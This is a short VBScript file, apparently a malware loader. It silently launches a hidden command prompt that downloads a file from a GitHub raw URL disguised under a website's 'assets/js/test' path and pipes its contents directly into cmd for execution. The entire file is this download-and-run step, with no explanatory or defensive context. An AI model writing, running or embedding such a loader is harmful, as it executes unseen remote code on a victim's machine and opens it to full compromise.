Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd /k curl https://raw.githubusercontent.com/svenrobbie/website/refs/heads/main/assets/js/test | cmd"
oShell.Run strArgs, 0, false